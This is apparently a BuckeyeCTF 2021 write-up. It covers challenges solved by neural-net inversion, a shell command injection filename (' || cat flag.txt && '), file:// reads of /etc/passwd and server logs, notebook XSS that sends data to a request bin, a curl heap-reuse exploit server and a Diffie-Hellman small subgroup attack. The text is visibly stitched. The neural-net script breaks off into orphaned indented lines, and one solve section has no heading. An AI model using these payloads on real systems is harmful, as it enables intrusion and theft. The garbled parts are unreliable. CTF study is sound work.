### Challenge description

I'm sure neural nets are great for encryption!

Attached files:
[src.py](https://raw.githubusercontent.com/cscosu/buckeyectf-2021/master/rev/neurotic/dist/src.py),

### Solve

tl;dr: math

The neural network is taking in the flag, performing some calculations,
and outputting some data. How can we invert the process?

With Google, of course!

[This StackOverflow question](https://stackoverflow.com/q/59878319) was extremely helpful in solving the challenge.
As it turns out, we can use the same approach here: same number of input and output neurons,
and the activation function is invertible.

While copying the code from StackOverflow, I was quite confused as to why the list returned by `model.stack.children()`
was only one long. It took me a few minutes to realize that in the NeuralNetwork constructor,
multiplying the list by 7 means that each layer refers to the same object.
Therefore, we can multiply the list by 7 while going in reverse,
and we don't care about order anymore since every object is the same.

Solve script:

```python
import torch
from torch import nn
import numpy as np
from functools import reduce
import base64


class NeuralNetwork(nn.Module):
    def __init__(self):
        super(NeuralNetwork, self).__init__()
        self.stack = nn.Sequential(*([nn.Linear(8, 8, bias=False)] * 7))

    def forward(self, x):
        x = self.stack(x)
        return x


device = "cuda" if torch.cuda.is_available() else "cpu"

model = NeuralNetwork().to(device)
model.load_state_dict(torch.load("model.pth"))

    z = z[..., None]  # 'torch.solve' requires N column vectors (i.e. shape (N, n, 1)).
    z = torch.linalg.solve(step.weight, z)
    z = torch.squeeze(z)  # remove the extra dimension that we've added for 'torch.solve'.

vals = z.detach().numpy().reshape(64)

### Solve

tl;dr: Shell command injection

Looking through the source, we see a command injection vulnerability.

![Vulnerability in the code](https://i.imgur.com/DHn3wrB.png)

The key aspect is the `shell=True` argument.
[The subprocess docs make a note of this potential vulnerability](https://docs.python.org/3/library/subprocess.html#security-considerations).

As a result, we can upload a file with the name `' || cat flag.txt && '` to get the flag.
The code will run `tesseract '' || cat flag.txt && '' || cat flag.txt && '' -l eng`,
which will have a non-zero return code and display the output.

## StegBot (54 solves, easy)

### Challenge description

Everybody loves [steghide](https://github.com/perfectblue/ctf-writeups/tree/master/2020/csaw-quals-2020/take-it-easy#step-3),
so I made **StegBot#2632** so that you can use it from Discord! Make sure to join our
[Discord server](https://discord.gg/WyUcFqrDjP) if you haven't already, and DM `/info` to StegBot to get started.

### Solve

tl;dr: `file://` protocol

StegBot accepts three different commands: `/info`, `/embed`, and `/extract`.

Sending the /info command to StegBot gives us a link to its source code: http://github.com/qxxxb/StegBot

`/embed` takes in an `image_url`, and two optional arguments: `message` and `password`.
Interestingly, if `message` is not supplied, the bot will give you back the image you sent it. This might be useful later.

`/extract` takes in two arguments: `image_url` and `password`. It calls steghide to extract the data embedded in an image.

Where is the flag? Before the bot starts, `stegEmbed` is called on `bof.jpg` located on the server,
with the flag as the message a randomly generated password.
We'll need to find the location on the server where the new image is stored and what the password was.

Looking more closely, we see a suspicious function:

![downloadFile function](https://i.imgur.com/MDdCLRd.png)

`downloadFile` is called by `/embed` and `/extract` to download the images from the given URLs.
curl can actually copy files for us by using the `file:// protocol`: `curl file://<absolute_filepath> -o <output>`.
We can abuse this to have the bot give us a file on the server.

Let's test by sending StegBot `/embed image_url:file:///etc/passwd`.
No message is given so StegBot gives us back the "image" it "downloads".

![StegBot response](https://i.imgur.com/AsSFOMW.png)

Opening the file gives us the contents of `/etc/passwd`. We're in.

Another two suspicious lines:

![logger instantiation](https://i.imgur.com/L040AX6.png)

![logging passwords](https://i.imgur.com/vZmfRu4.png)

logger nicely logs all images, outputs, and passwords passed into `stegEmbed`!
We can use this to find the location of the image where the flag is embedded as well as the password used.
Let's use our file access trick from earlier to get the contents of `/app/app.log` (`/embed image_url: file:///app/app.log`).

```
{"level":30,"time":1635135715767,"pid":1,"hostname":"NSJAIL","imagePath":"bof.jpg","outputPath":"/tmp/images/bd15e11499c9abf6dc94c22025824ca5.jpg","password":"389c08e3094e41c3022d55ee7c25aa8b"}
{"level":30,"time":1635138043700,"pid":1,"hostname":"NSJAIL","imagePath":"/tmp/images/aa4fcc7c4c01f91f3b8a64bbde05fee4.jpg","outputPath":"/tmp/images/7ad58dbe201bee205c6be7530cbea108.jpg","password":"meow"}
```

Bingo. Finish this off by extracting the flag from the image:
`/extract image_url: file:///tmp/images/bd15e11499c9abf6dc94c22025824ca5.jpg password: 389c08e3094e41c3022d55ee7c25aa8b`

### Solve

tl;dr: XSS in a Jupyter notebook cell

![upload notebook button](https://i.imgur.com/byELQSL.png)

The premise is pretty simple: you upload a Jupyter notebook, and the admin will open it.

Has anyone wanted to auto-run code in a Jupyter notebook on open?
A quick Google search later, the answer is yes. [StackOverflow saves the day again](https://stackoverflow.com/a/38856870).

The comments mention that the notebook needs to be "trusted," whatever that means. Is that going to be a problem for us?

![upload_ipynb function](https://i.imgur.com/PdQjm1R.png)

(line 24) Turns out not.

It's now just a matter of piecing together the auto-run all cells answer and some code that POSTs
the contents of some command to a request bin.

![auto-run code in a jupyter notebook](https://i.imgur.com/Y5jVI4N.png)

Digging around, we can find the location of the flag and send that to our request bin.

## Curly fries (8 solves, medium)

### Challenge description

It's curl as a service

`nc web.chall.pwnoh.io 13372`

Attachments: [curly_fries.zip](https://github.com/cscosu/buckeyectf-2021/blob/master/web/curly_fries/dist/curly_fries.zip)

### Solve

tl;dr: Incorrect Content-Length header detection, heap data re-use

Once we connect to the server, we're prompted for a URL for it to curl.
Afterwards, the server gives us the response headers as well as its contents.

Taking a look at the source, there are a few interesting finds.
Before the URL is fetched, a `verify_flag_file` function is run that mallocs a 1024-byte buffer
and reads the flag into it. It checks that the read-in flag starts with the correct string and finally frees the buffer.

curly_fries uses libcurl to fetch the headers and the response data of a URL.
Upon receiving a `Content-Length` header, a buffer of the right size is allocated to hold the response data.
After all data is received, the contents of the response buffer is printed out with `puts`.

![header_callback function](https://i.imgur.com/5NMzvPN.png)

The Content-Length header checks at line 26/27 are incorrect.
If we send a header field such as `Content-Lengthw: 1023`,
the allocation of a 1024-byte buffer for response will occur,
but curl won't recognize this as a valid Content-Length header so it won't error if we don't send enough data.

`malloc` should now give us back the buffer that contained the flag contents that were read from `verify_flag_file()`,
and it won't be overwritten by our response! But can we output this?

According to the [curl docs for the write callback](https://curl.se/libcurl/c/CURLOPT_WRITEFUNCTION.html),
the data given to it is not null-terminated.
This is perfect as the null-termination for the buffer before printing done by `curly_fries`
is only at the end of `response_buf`, which it thinks is 1024 bytes long.

Lastly, the first 16 bytes in the response buffer will be null bytes as `malloc`
internally uses two pointers at the start of each free chunk to keep track of them.
We will need to send 16 characters in our response to zero these out.

Putting all of this together, we get the solve script:

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('0.0.0.0', 6969))
s.listen()

conn, addr = s.accept()
print('Accepted connection.')
with conn:
    data = b''
    while not data.endswith(b'\r\n\r\n'):
        data += conn.recv(1)

    print(data)

    conn.sendall(
        b'HTTP/1.1 200 OK\r\n'
        b'Content-Lengthw: 1023\r\n'
        b'\r\n' + b'a'*16
    )

s.close()
```

And giving a URL pointing to this script to curly_fries gets us our flag.

# Crypto

## Key exchange 2 (34 solves, easy)

### Challenge description

No public key this time!

`nc crypto.chall.pwnoh.io 13386`

Attachments: [server.py](https://github.com/cscosu/buckeyectf-2021/raw/master/crypto/key_exchange_2/dist/server.py)

### Solve

tl;dr: small subgroup attack

We're performing Diffie Hellman key exchange. However, we're not given A's public key!
Can we still figure out the shared secret?

For a basic primer on DHKE and the math behind it, take a look at the
[Wikipedia page](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange#Cryptographic_explanation).

The major problem is that we don't know $A$ anymore.
Let's take a look at what we have control over and see if we can use some trick to find the shared secret.

Alice is calculating the shared secret using the equation $s=B^a \mod p$. $p$ is given to us and we also have control over $B$ as we're playing the role of Bob.
Is there any way to set $B$ in some way (according to the code,
$B$ must be between $2$ and $p-2$) to be able to find value of $s$ given an arbitrary $a \in [2, p-1)$?

Not exactly, but we can get close.

**Concrete examples**

Let $p=31$. If we set $B=25$, what possible values for $s$ do we have?

$B^2 = 625,\; 625 \equiv 5 \mod p$

$B^3 =15625,\; 15625 \equiv 1 \mod p$

$B^4=390625,\; 390625 \equiv 25 \mod p$

$B^5=9765625,\; 9765625 \equiv 5 \mod p$

Hold on, we've looped back around! If you continue for the possible values of $p$, you'll se that $s$ can only have three possible values: 5, 1, and 25. If we can constrain our $s$ to only have a few possible values, then that means we can try all of them to see which one work to decrypt the ciphertext.
